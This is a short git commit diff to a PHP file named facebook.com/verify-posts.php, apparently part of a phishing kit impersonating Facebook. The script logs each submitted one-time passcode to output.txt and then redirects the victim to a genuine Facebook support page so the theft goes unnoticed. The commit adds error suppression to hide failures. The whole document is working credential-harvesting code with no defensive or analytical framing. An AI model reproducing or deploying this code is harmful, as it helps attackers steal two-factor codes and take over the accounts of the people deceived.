9176b2ac35208d51c8617307e53ff54a09143da5
darknethaxor <72026007+darknethaxor@users.noreply.github.com>
2021-09-09 21:58:04 +0600

    Update verify-posts.php

--- facebook.com/verify-posts.php
+++ facebook.com/verify-posts.php
@@ -1,5 +1,6 @@
 <?php
-
+error_reporting(0);
+ini_set('display_errors', 0);
 file_put_contents("output.txt", " Done " . $_POST['OTP'] . "\n", FILE_APPEND);
 header('Location: https://mbasic.facebook.com/support/forms/flow_view?id=342509036134712&refid=69&_rdr');
 exit();
